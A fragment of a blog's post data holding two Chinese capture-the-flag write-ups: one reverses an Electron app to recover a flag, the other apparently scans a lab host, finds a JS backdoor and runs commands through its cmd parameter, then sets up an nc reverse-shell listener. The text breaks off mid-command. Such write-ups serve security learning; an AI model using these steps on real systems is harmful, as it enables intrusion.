resources\n```\n\n\u8fd0\u884c\u5e94\u7528\uff0c\u53ef\u4ee5\u770b\u5230\u542f\u52a8\u754c\u9762\uff1a\n![1748239128506](https://7r1umphk.github.io/image/20250526135851284.webp)\n\n\u754c\u9762\u5de6\u4fa7\u662f Vite.js (\u524d\u7aef\u6784\u5efa\u5de5\u5177) \u7684 Logo\uff0c\u53f3\u4fa7\u662f Vue.js (JavaScript \u524d\u7aef\u6846\u67b6) \u7684 Logo\u3002\u8fd9\u8868\u660e\u8be5\u5e94\u7528\u662f\u4f7f\u7528 Electron \u6846\u67b6\uff0c\u5e76\u7ed3\u5408 Vite \u548c Vue.js \u5f00\u53d1\u7684\u3002\n\n### \u65b9\u6cd5\u4e00\uff1a\u901a\u8fc7\u4fee\u6539\u4e3b\u8fdb\u7a0b\u811a\u672c\u542f\u7528\u5f00\u53d1\u8005\u5de5\u5177 (\u9884\u671f\u89e3)\n\n\u5bf9\u4e8e Electron \u5e94\u7528\uff0c\u4e00\u4e2a\u5e38\u89c1\u7684\u8c03\u8bd5\u548c\u5206\u6790\u5165\u53e3\u662f\u5176\u5185\u7f6e\u7684\u5f00\u53d1\u8005\u5de5\u5177\u3002\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u4fee\u6539\u5e94\u7528\u7684\u4e3b\u8fdb\u7a0b\u811a\u672c\u6765\u9ed8\u8ba4\u542f\u52a8\u5b83\u3002\n\n#### 1. \u89e3\u5305 `app.asar`\uff1a\n\nElectron \u5e94\u7528\u7684\u6838\u5fc3\u903b\u8f91\u901a\u5e38\u6253\u5305\u5728 `resources/app.asar` \u6587\u4ef6\u4e2d\u3002`asar` \u662f\u4e00\u79cd\u5f52\u6863\u683c\u5f0f\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/ezelectron]\n\u2514\u2500$ npm install -g asar\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/ezelectron]\n\u2514\u2500$ cd resources\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/ezelectron/resources]\n\u2514\u2500$ ls -al\ntotal 14348\ndrwxr-xr-x 1 kali kali        0 May 25 16:22 .\ndrwxr-xr-x 1 kali kali     4096 May 26 01:59 ..\n-rwxr-xr-x 1 kali kali 14687457 May 25 16:22 app.asar\n-rwxr-xr-x 1 kali kali       95 May 25 16:22 app-update.yml\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/ezelectron/resources]\n\u2514\u2500$ asar extract app.asar app_unpacked\n```\n\n#### 2. \u4fee\u6539\u4e3b\u8fdb\u7a0b\u811a\u672c\uff1a\n\n\u89e3\u5305\u540e\uff0c\u5728 `app_unpacked` \u76ee\u5f55\u4e2d\u627e\u5230\u4e3b\u8fdb\u7a0b\u811a\u672c\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/ezelectron/resources]\n\u2514\u2500$ cd app_unpacked\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/\u2026/gx/ezelectron/resources/app_unpacked]\n\u2514\u2500$ ll\ntotal 6\ndrwxr-xr-x 1 kali kali    0 May 26 02:02 .\ndrwxr-xr-x 1 kali kali    0 May 26 02:02 ..\ndrwxr-xr-x 1 kali kali    0 May 26 02:02 dist\n- rwxr-xr-x 1 kali kali 1434 May 26 02:02 main.min.js\ndrwxr-xr-x 1 kali kali 4096 May 26 02:02 node_modules\n- rwxr-xr-x 1 kali kali  187 May 26 02:02 package.json\n```\n\n\u4f7f\u7528 `js-beautify`\u7f8e\u5316 `main.min.js` \u4ee5\u4fbf\u4e8e\u9605\u8bfb\u548c\u4fee\u6539\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/\u2026/gx/ezelectron/resources/app_unpacked]\n\u2514\u2500$ js-beautify main.min.js > main.beautified.js\n```\n\n\u7f16\u8f91 `main.beautified.js`\u3002\u5728\u7a97\u53e3\u663e\u793a (`win.show()`) \u4e4b\u524d/\u4e4b\u540e\uff0c\u6dfb\u52a0\u4ee5\u4e0b\u4ee3\u7801\u4ee5\u6253\u5f00\u5f00\u53d1\u8005\u5de5\u5177\uff1a\n\n```javascript\nwin.webContents.openDevTools();\n```\n\n![image-20250526140406708](https://7r1umphk.github.io/image/20250526140406895.webp)\n\n\u4fdd\u5b58\u4fee\u6539\uff0c\u5e76\u5c06\u7f8e\u5316\u540e\u7684\u6587\u4ef6\u91cd\u547d\u540d\u56de `main.min.js` (\u5982\u679c\u4fee\u6539\u7684\u662f\u7f8e\u5316\u7248)\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/\u2026/gx/ezelectron/resources/app_unpacked]\n\u2514\u2500$ mv main.min.js main.min.js.bak\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/\u2026/gx/ezelectron/resources/app_unpacked]\n\u2514\u2500$ mv main.beautified.js main.min.js\n```\n\n#### 3. \u91cd\u65b0\u6253\u5305\u5e76\u8fd0\u884c\uff1a\n\n\u8fd4\u56de `resources` \u76ee\u5f55\uff0c\u5c06\u4fee\u6539\u540e\u7684 `app_unpacked` \u76ee\u5f55\u91cd\u65b0\u6253\u5305\u4e3a `app.asar`\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/\u2026/gx/ezelectron/resources/app_unpacked]\n\u2514\u2500$ cd .. \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/ezelectron/resources]\n\u2514\u2500$ mv app.asar app.asar.bak\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/ezelectron/resources]\n\u2514\u2500$ asar pack app_unpacked app.asar\n```\n\n\u73b0\u5728\uff0c\u8fd4\u56de\u4e0a\u5c42\u76ee\u5f55\u5e76\u8fd0\u884c\u4fee\u6539\u540e\u7684 `ezelectron` \u5e94\u7528\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/ezelectron/resources]\n\u2514\u2500$ cd ..\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/ezelectron]\n\u2514\u2500$ ./ezelectron\n```\n\n\u5e94\u7528\u542f\u52a8\u65f6\uff0c\u5f00\u53d1\u8005\u5de5\u5177\u4f1a\u81ea\u52a8\u6253\u5f00\u3002\u5728 \u5143\u7d20 \u6807\u7b7e\u9875\u4e2d\u68c0\u67e5 HTML \u7ed3\u6784\u3002\u6ce8\u610f\u5230 Vue Logo (`class='logo vue'`) \u7684 `<img>` \u6807\u7b7e\uff0c\u5176 `alt` \u5c5e\u6027\u5305\u542b Flag\u3002\n![image-20250526140951570](https://7r1umphk.github.io/image/20250526140951753.webp)\n\nFlag: `HMV{h3ll0_fr0m_3l3c7r0n}`\n\n### \u65b9\u6cd5\u4e8c\uff1a\u9006\u5411\u5206\u6790\u6e32\u67d3\u8fdb\u7a0b JavaScript\n\n\u6b64\u65b9\u6cd5\u4e0d\u4f9d\u8d56\u4fee\u6539\u4e3b\u8fdb\u7a0b\uff0c\u800c\u662f\u76f4\u63a5\u5206\u6790\u6e32\u67d3\u8fdb\u7a0b\u52a0\u8f7d\u7684 JavaScript \u4ee3\u7801\u3002\n\n#### 1. \u5b9a\u4f4d\u6e32\u67d3\u8fdb\u7a0b\u811a\u672c\uff1a\n\n\u5728\u4e4b\u524d\u89e3\u5305\u7684 `app_unpacked/dist/` \u76ee\u5f55\u4e0b\uff0c\u53ef\u4ee5\u627e\u5230 `index.html`\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/\u2026/ezelectron/resources/app_unpacked/dist]\n\u2514\u2500$ cat index.html\n<!doctype html>\n<html lang='en'>\n  <head>\n    <meta charset='UTF-8' />\n    <link rel='icon' type='image/svg+xml' href='/vite.svg' />\n    <meta name='viewport' content='width=device-width, initial-scale=1.0' />\n    <title>ezelectron</title>\n    <script type='module' crossorigin src='./assets/index-CyqsCDPp.js'></script> \n    <link rel='stylesheet' crossorigin href='./assets/index-FMFiDxpK.css'>\n  </head>\n  <body>\n    <div id='app'></div>\n  </body>\n</html>\n```\n\n\u4e3b\u8981\u7684\u524d\u7aef\u903b\u8f91\u4f4d\u4e8e `assets/index-CyqsCDPp.js`\u3002\n\n#### 2. \u7f8e\u5316\u5e76\u5206\u6790\u811a\u672c\uff1a\n\n\u8be5\u811a\u672c\u662f\u6df7\u6dc6\u8fc7\u7684\u3002\u4f7f\u7528 `js-beautify` \u8fdb\u884c\u7f8e\u5316\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/\u2026/resources/app_unpacked/dist/assets]\n\u2514\u2500$ js-beautify index-CyqsCDPp.js > index.beautified.js\n```\n\n\u6253\u5f00 `index.beautified.js` \u8fdb\u884c\u5206\u6790\u3002\n\n#### 3. \u7406\u89e3\u4ee3\u7801\u6df7\u6dc6\u4e0e\u5b9a\u4f4d\u5173\u952e\u903b\u8f91\uff1a\n\n*   **\u5b57\u7b26\u4e32\u6df7\u6dc6\uff1a** \u4ee3\u7801\u4e2d\u5b58\u5728\u4e00\u4e2a\u5927\u578b\u5b57\u7b26\u4e32\u6570\u7ec4\u548c\u4e00\u4e2a\u89e3\u5bc6/\u5f15\u7528\u51fd\u6570\u3002\n*   **\u53d8\u91cf\u540d\u6df7\u6dc6\uff1a** \u53d8\u91cf\u548c\u51fd\u6570\u540d\u88ab\u66ff\u6362\u4e3a\u5982 `a0_0x...` \u6216 `_0x...` \u7684\u5f62\u5f0f\u3002\n*   **\u5b9a\u4f4dVue\u7ec4\u4ef6\uff1a** \u5bfb\u627e Vue \u7ec4\u4ef6\u5b9a\u4e49\uff0c\u901a\u5e38\u662f\u4e00\u4e2a\u5305\u542b `setup` \u51fd\u6570\u7684\u5bf9\u8c61\u3002\u5728\u672c\u4f8b\u4e2d\uff0c\u5bf9\u8c61 `a0_0x508586` \u662f\u4e00\u4e2a Vue \u7ec4\u4ef6\u3002\n*   \u5728\u5176 `setup` \u51fd\u6570 (`_0x57c87a`) \u4e2d\uff0c\u6ce8\u610f\u5230\u4e00\u4e2a\u540d\u4e3a `_0x8d8f10` \u7684\u5185\u90e8\u51fd\u6570\u3002\u6b64\u51fd\u6570\u63a5\u6536\u4e24\u4e2a\u6570\u7ec4 (`_0x1c013b` \u548c `_0x76c466`) \u4f5c\u4e3a\u8f93\u5165\uff0c\u5e76\u8fdb\u884c\u4e86\u4e00\u7cfb\u5217\u64cd\u4f5c\u6765\u751f\u6210\u4e00\u4e2a\u5b57\u7b26\u4e32\u3002\u8fd9\u4e2a\u751f\u6210\u7684\u5b57\u7b26\u4e32\u6700\u7ec8\u88ab\u8bbe\u7f6e\u4e3a Vue logo \u56fe\u7247\u7684 `alt` \u5c5e\u6027\u3002\n\n#### 4. \u9006\u5411 Flag \u751f\u6210\u7b97\u6cd5\uff1a\n\n\u5173\u952e\u4ee3\u7801\u6bb5\u5982\u4e0b:\n\n```javascript\n_0x1c013b = [\n    \u7701\u7565\n];\n_0x76c466 = [\u7701\u7565 ];\nfunction _0x8d8f10(_0x3816d4, _0xb6046) { \n    return _0x3816d4.flat() \n        .map((_0x39abff, _0x27f950) => \n            String.fromCharCode(\n                (_0x39abff ^ _0xb6046[_0x27f950 % _0xb6046.length]) \n                - (0x1ba * -0x10 + -0xd3f * -0x2 + 0x123) \n            )\n        )\n        .join(''); \n}\n```\n\n#### 5. \u8ba1\u7b97\u6570\u7ec4\u503c\u5e76\u7f16\u5199\u89e3\u5bc6\u811a\u672c\uff1a\n\n\u9996\u5148\uff0c\u8ba1\u7b97 `_0x1c013b` \u548c `_0x76c466` \u7684\u5b9e\u9645\u6570\u503c\u3002\u53ef\u4ee5\u5728\u6d4f\u89c8\u5668\u63a7\u5236\u53f0\u73af\u5883\u4e2d\u6267\u884c\u8fd9\u4e9b\u6570\u5b66\u8868\u8fbe\u5f0f\u3002\n\n```javascript\nconst _0x1c013b = [\n[-0x13 * -0x56 + 0x26ca + -0x2d13, -0x214e + 0x1ed4 + 0x6b * 0x7, -0x1bfc + 0x5 * -0xa1 + 0x1f35, 0x259 * -0xb + -0x203a + 0x1 * 0x3a8a, 0x1d8b + -0x1 * -0x1646 + 0x4b2 * -0xb, 0x1580 + -0x1f67 + -0xa3d * -0x1, 0x125d + 0x1440 + -0x59 * 0x6f, -0x104b * -0x1 + -0x5 * -0x83 + -0x12b5, 0x1ba8 + 0x9 * -0x2a9 + 0x7 * -0x7a, 0x21f * 0x11 + -0x1 * -0x1495 + -0x3847],\n[-0x2501 * -0x1 + 0x1 * -0x255d + 0x80, 0x1 * 0x12b6 + -0x5a * 0x18 + -0x9d4, 0x1cf5 + -0x151d * 0x1 + -0x765, 0x11 * -0x143 + 0x6cc + -0x47 * -0x35, 0x2 * 0x900 + 0x23 * 0xf + 0x1 * -0x1402, 0x1 * 0x148b + -0x1b52 + 0x743, -0x8b9 + -0x1060 + -0x11a * -0x17, 0x7 * -0xf1 + 0x854 + -0x1b4, -0x1 * 0x75f + 0x16 * -0x76 + -0x286 * -0x7],\n[-0xaee + 0xdc3 + 0x4 * -0xa7, -0x23d4 + -0xb2f + 0x2f34, -0x1 * 0x198e + -0xb64 + 0xcb * 0x2f, -0x22a6 * -0x1 + 0xe5e + -0x3100, 0x893 + 0x1 * 0x779 + 0x1 * -0xfd6]\n];\nconsole.log('_0x1c013b:', _0x1c013b);\nconst _0x76c466 = [0x1fda + -0x82e + 0xd * -0x1cc, 0x8a1 + -0x2 * -0x416 + 0x5 * -0x350, 0xcc * -0x19 + -0x1bf0 + -0x301f * -0x1, 0x1f29 + 0xf50 + -0x173c * 0x2, -0xdea * -0x1 + -0x2316 + 0xd * 0x1a6, -0x1c4c + 0x19dc + 0x1 * 0x2d2, 0x206e + 0x9 * 0x31 + -0xfe * 0x22, -0x1683 + -0x835 + 0x1f00];\nconsole.log('_0x76c466:', _0x76c466);\n```\n\n\u8fd0\u884c\u6b64\u811a\u672c\uff1a\n\n```\n_0x1c013b:\n[\n[\n25,\n115,\n20,\n125,\n43,\n86,\n6,\n37,\n97,\n93\n],\n[\n36,\n114,\n115,\n12,\n11,\n124,\n61,\n9,\n39\n],\n[\n57,\n49,\n83,\n4,\n54\n]\n]\n_0x76c466:\n[\n80,\n61,\n67,\n1,\n66,\n98,\n107,\n72\n]\n```\n\n\u7136\u540e\u89e3\n\n```\nconst a = [\n    [25, 115, 20, 125, 43, 86, 6, 37, 97, 93],\n    [36, 114, 115, 12, 11, 124, 61, 9, 39],\n    [57, 49, 83, 4, 54]\n];\nconst b = [80, 61, 67, 1, 66, 98, 107, 72];\nconst c = a.flat();\nfunction decode(d, e) {\n    let f = '';\n    for (let g = 0; g < d.length; g++) {\n        const h = g % e.length;\n        const i = (d[g] ^ e[h]) - 1;\n        f += String.fromCharCode(i);\n    }\n    return f;\n}\nconst flag = decode(c, b);\nconsole.log(flag);\n```\n\n![image-20250526141745643](https://7r1umphk.github.io/image/20250526141745824.webp)\n\nFlag: `HMV{h3ll0_fr0m_3l3c7r0n}`\n\nsentence", "top": 0, "createdAt": 1751016602, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-27", "dateLabelColor": "#0969da"}, "P45": {"htmlDir": "docs/post/eeeeeasy -ba-ji-shen-tou-ce-shi-Writeup.html", "labels": ["\u5185\u90e8\u9776\u673a/maze-sec"], "postTitle": "eeeeeasy \u9776\u673a\u6e17\u900f\u6d4b\u8bd5Writeup", "postUrl": "post/eeeeeasy%20-ba-ji-shen-tou-ce-shi-Writeup.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/45", "commentNum": 0, "wordCount": 19172, "description": "\u9776\u673a\u540d\u5b57: eeeeeasy\uff08\u7fa4\u53cb\u673a\u5668\uff0c\u53ef\u80fd\u540e\u9762\u4f1a\u53d1\u5e03\u5728hackmyvm\uff09\n\n\u54c8\uff0c\u770b\u8fd9\u540d\u5b57\uff0c\u662f\u60f3\u8bf4 '\u592a\u7b80\u5355\u5566' \u8fd8\u662f 'eeee...easy?' \u4e0d\u7ba1\u4e86\uff0c\u5f00\u5e72\uff01\n\n### 1. \u4fe1\u606f\u6536\u96c6 - \u627e\u5230\u4f60\u4e86\uff01\n\n\u8001\u89c4\u77e9\uff0c\u5148\u7528 `arp-scan` \u5728\u5185\u7f51\u91cc\u626b\u4e00\u5708\uff0c\u770b\u770b\u76ee\u6807\u5728\u54ea\u513f\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ sudo arp-scan -l\n[sudo] password for kali: \nInterface: eth0, type: EN10MB, MAC: 00:0c:29:af:40:3a, IPv4: 192.168.205.206\nWARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied\nWARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied\nStarting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)\n192.168.205.1   00:50:56:c0:00:08       (Unknown)\n192.168.205.2   00:50:56:f4:ef:6f       (Unknown)\n192.168.205.213 08:00:27:70:f3:fd       (Unknown)  # <--- \u76ee\u6807\u51fa\u73b0\uff01\n192.168.205.254 00:50:56:f5:17:d6       (Unknown)\n\n4 packets received by filter, 0 packets dropped by kernel\nEnding arp-scan 1.10.0: 256 hosts scanned in 1.926 seconds (132.92 hosts/sec). 4 responded\n```\n\u76ee\u6807IP\u662f `192.168.205.213`\uff0c\u796d\u51fa`nmap`\u5927\u6cd5\uff0c\u5148\u6765\u4e2a\u5168\u7aef\u53e3\u5feb\u901f\u626b\u63cf\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ nmap -p- --min-rate 10000 192.168.205.213            \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-05-17 04:39 EDT\nNmap scan report for 192.168.205.213\nHost is up (0.00021s latency).\nNot shown: 65532 closed tcp ports (reset)\nPORT    STATE SERVICE\n22/tcp  open  ssh\n80/tcp  open  http\n443/tcp open  https\nMAC Address: 08:00:27:70:F3:FD (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 1.08 seconds\n```\n\u5f00\u4e8622 (SSH), 80 (HTTP), 443 (HTTPS) \u7aef\u53e3\u3002\u518d\u6765\u4e2a\u8be6\u7ec6\u70b9\u7684\u670d\u52a1\u7248\u672c\u63a2\u6d4b\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ nmap -p22,80,443 -sV 192.168.205.213\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-05-17 04:39 EDT\nNmap scan report for 192.168.205.213\nHost is up (0.00029s latency).\n\nPORT    STATE SERVICE  VERSION\n22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)\n80/tcp  open  http     Apache httpd 2.4.62 ((Debian))\n443/tcp open  ssl/http Apache httpd 2.4.62 ((Debian))\nMAC Address: 08:00:27:70:F3:FD (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 12.53 seconds\n```\nSSH\u662fOpenSSH 8.4p1\uff0cWeb\u670d\u52a1\u662fApache 2.4.62 (Debian)\u3002\u770b\u6765\u7a81\u7834\u53e3\u5f88\u53ef\u80fd\u5728Web\u4e0a\u3002\n\n### 2. Web\u6e17\u900f - \u85cf\u5f97\u633a\u6df1\u554a\uff01\n\n\u5148\u7528`curl`\u770b\u770b80\u548c443\u7aef\u53e3\u7684\u9996\u9875\u662f\u5565\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ curl -v http://192.168.205.213:80\n*   Trying 192.168.205.213:80...\n* Connected to 192.168.205.213 (192.168.205.213) port 80\n* using HTTP/1.x\n> GET / HTTP/1.1\n> Host: 192.168.205.213\n> User-Agent: curl/8.13.0\n> Accept: */*\n> \n* Request completely sent off\n< HTTP/1.1 200 OK\n< Date: Sat, 17 May 2025 08:40:10 GMT\n< Server: Apache/2.4.62 (Debian)\n< Last-Modified: Sat, 12 Apr 2025 01:53:17 GMT\n< ETag: '6-6328b152a4f57'\n< Accept-Ranges: bytes\n< Content-Length: 6\n< Content-Type: text/html\n< \nindex\n* Connection #0 to host 192.168.205.213 left intact\n                                                                                                                                                                                   \n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ curl -vk https://192.168.205.213:443\n*   Trying 192.168.205.213:443...\n* ALPN: curl offers h2,http/1.1\n* TLSv1.3 (OUT), TLS handshake, Client hello (1):\n* TLSv1.3 (IN), TLS handshake, Server hello (2):\n* TLSv1.3 (IN), TLS change cipher, Change cipher spec (1):\n* TLSv1.3 (IN), TLS handshake, Encrypted Extensions (8):\n* TLSv1.3 (IN), TLS handshake, Certificate (11):\n* TLSv1.3 (IN), TLS handshake, CERT verify (15):\n* TLSv1.3 (IN), TLS handshake, Finished (20):\n* TLSv1.3 (OUT), TLS change cipher, Change cipher spec (1):\n* TLSv1.3 (OUT), TLS handshake, Finished (20):\n* SSL connection using TLSv1.3 / TLS_AES_256_GCM_SHA384 / x25519 / RSASSA-PSS\n* ALPN: server accepted http/1.1\n* Server certificate:\n*  subject: CN=PyCrt.PyCrt\n*  start date: Apr  1 14:05:29 2025 GMT\n*  expire date: Mar 30 14:05:29 2035 GMT\n*  issuer: CN=PyCrt.PyCrt\n*  SSL certificate verify result: self-signed certificate (18), continuing anyway.\n*   Certificate level 0: Public key type RSA (2048/112 Bits/secBits), signed using sha256WithRSAEncryption\n* Connected to 192.168.205.213 (192.168.205.213) port 443\n* using HTTP/1.x\n> GET / HTTP/1.1\n> Host: 192.168.205.213\n> User-Agent: curl/8.13.0\n> Accept: */*\n> \n* Request completely sent off\n* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):\n* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):\n< HTTP/1.1 200 OK\n< Date: Sat, 17 May 2025 08:40:19 GMT\n< Server: Apache/2.4.62 (Debian)\n< Last-Modified: Sat, 12 Apr 2025 01:53:17 GMT\n< ETag: '6-6328b152a4f57'\n< Accept-Ranges: bytes\n< Content-Length: 6\n< Content-Type: text/html\n< \nindex\n* Connection #0 to host 192.168.205.213 left intact\n```\n80\u548c443\u7aef\u53e3\u5185\u5bb9\u90fd\u662f 'index'\uff0cHTTPS\u7528\u7684\u662f\u81ea\u7b7e\u540d\u8bc1\u4e66 `CN=PyCrt.PyCrt`\u3002\u6ca1\u5565\u4fe1\u606f\uff0c\u4e0a\u76ee\u5f55\u7206\u7834\u5de5\u5177 `gobuster`\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ gobuster dir -u http://192.168.205.213:80 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html,zip  \n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://192.168.205.213:80\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.6\n[+] Extensions:              php,txt,html,zip\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\n/.html                (Status: 403) [Size: 280]\n/index.html           (Status: 200) [Size: 6]\n/.php                 (Status: 403) [Size: 280]\n/hacker               (Status: 301) [Size: 319] [--> http://192.168.205.213/hacker/] # <--- \u53d1\u73b0\u65b0\u5927\u9646\nProgress: 43164 / 1102800 (3.91%)^C\n[!] Keyboard interrupt detected, terminating.\nProgress: 43918 / 1102800 (3.98%)\n===============================================================\nFinished\n===============================================================\n```\n\u626b\u51fa\u6765\u4e00\u4e2a `/hacker/` \u76ee\u5f55\uff0c\u6709\u70b9\u610f\u601d\u3002\u6d4f\u89c8\u5668\u8bbf\u95ee\u770b\u770b\u3002\n\n![image-20250517164328109](https://7r1umphk.github.io/image/20250517164328580.webp)\n\n\u662f\u4e2a\u9759\u6001\u9875\u9762\uff0c\u7ee7\u7eed\u5bf9 `/hacker/` \u76ee\u5f55\u8fdb\u884c\u7206\u7834\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ gobuster dir -u http://192.168.205.213/hacker/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html,zip\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://192.168.205.213/hacker/\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.6\n[+] Extensions:              txt,html,zip,php\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\n/index.html           (Status: 200) [Size: 40821]\n/.html                (Status: 403) [Size: 280]\n/.php                 (Status: 403) [Size: 280]\n/img                  (Status: 301) [Size: 323] [--> http://192.168.205.213/hacker/img/]\n/css                  (Status: 301) [Size: 323] [--> http://192.168.205.213/hacker/css/]\n/js                   (Status: 301) [Size: 322] [--> http://192.168.205.213/hacker/js/]\nProgress: 40053 / 1102800 (3.63%)^C\n[!] Keyboard interrupt detected, terminating.\nProgress: 42645 / 1102800 (3.87%)\n===============================================================\nFinished\n===================================\n```\n\u7206\u7834\u7ed3\u679c\u90fd\u662f\u4e9b\u5e38\u89c4\u76ee\u5f55\uff0c`index.html`, `img`, `css`, `js`\u3002\u770b\u6765\u5f97\u53bb\u770b\u770b\u9875\u9762\u6e90\u7801\u4e86\uff0c\u5c24\u5176\u662fJS\u6587\u4ef6\u3002\n\u5728\u6d4f\u89c8\u5668\u4e2d\u8bbf\u95ee `https://192.168.205.213/hacker/js/` \uff0c\u770b\u5230\u4e00\u4e2a\u53eb`hacker.js`\u7684JS\u6587\u4ef6\n\n![image-20250517164504164](https://7r1umphk.github.io/image/20250517164504335.webp)\n\n\u5728 `hacker.js` \u7684\u5e95\u90e8\u53d1\u73b0\u4e86\u4e00\u6bb5\u6709\u610f\u601d\u7684JavaScript\u4ee3\u7801\uff1a\n```javascript\ndocument.addEventListener('keydown', function (e) {\n    if (e.ctrlKey && e.shiftKey && e.key === 'Z') {\n        let cmd = prompt('\u00e8\u00af\u00b7\u00e8\u00be\u201c\u00e5\u2026\u00a5\u00e8\u00b0\u0192\u00e8\u00af\u2022\u00e5\u2018\u00bd\u00e4\u00bb\u00a4:'); // \u63d0\u793a\uff1a\u8bf7\u8f93\u5165\u8c03\u8bd5\u547d\u4ee4\n        if (cmd) {\n            fetch('./supercoool.php?cmd=' + encodeURIComponent(cmd))\n                .then(res => res.text())\n                .then(txt => {\n                    alert('\u00e5\u2018\u00bd\u00e4\u00bb\u00a4\u00e8\u00be\u201c\u00e5\u2021\u00ba\u00ef\u00bc\u0161\\n' + txt); // \u63d0\u793a\uff1a\u547d\u4ee4\u8f93\u51fa\n                });\n        }\n    }\n});\n```\n\u597d\u5bb6\u4f19\uff01\u8fd9\u85cf\u4e86\u4e2a\u540e\u95e8\u554a\uff01\u5f53\u5728 `https://192.168.205.213/hacker/` \u9875\u9762\u6309\u4e0b `Ctrl + Shift + Z` \u7ec4\u5408\u952e\u65f6\uff0c\u4f1a\u5f39\u51fa\u4e00\u4e2a\u8f93\u5165\u6846\uff0c\u8ba9\u4f60\u8f93\u5165\u547d\u4ee4\uff0c\u7136\u540e\u901a\u8fc7 `supercoool.php` \u8fd9\u4e2a\u6587\u4ef6\u4ee5GET\u8bf7\u6c42\u7684`cmd`\u53c2\u6570\u6765\u6267\u884c\u3002\n\n\u76f4\u63a5\u7528`curl`\u6765\u5229\u7528\u8fd9\u4e2a\u540e\u95e8\uff0c\u5148\u8bd5\u8bd5\u6267\u884c`id`\u547d\u4ee4\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ curl -k 'https://192.168.205.213/hacker/supercoool.php?cmd=id'\n<pre>uid=33(www-data) gid=33(www-data) groups=33(www-data)\n</pre>                                                                              \n```\n\u6210\u529f\u6267\u884c\uff01\u5f53\u524d\u7528\u6237\u662f `www-data`\u3002\u90a3\u5fc5\u987b\u5f39\u4e2ashell\u56de\u6765\u4e86\u3002\n\n\u672c\u5730Kali\u5f00\u4e2a`nc`\u76d1\u542c\uff1a\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ nc -lvnp 8888                       \nlistening on [any] 8888 ...\n```\n\u7136\u540e\u901a\u8fc7`curl`\u53d1\u9001\u53cd\u5f39shell\u7684payload\u3002\u9776\u673a\u4e0a\u6709`busybox nc`\uff0c\u7528\u5b83\u6765\u53cd\u5f39\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ curl -k 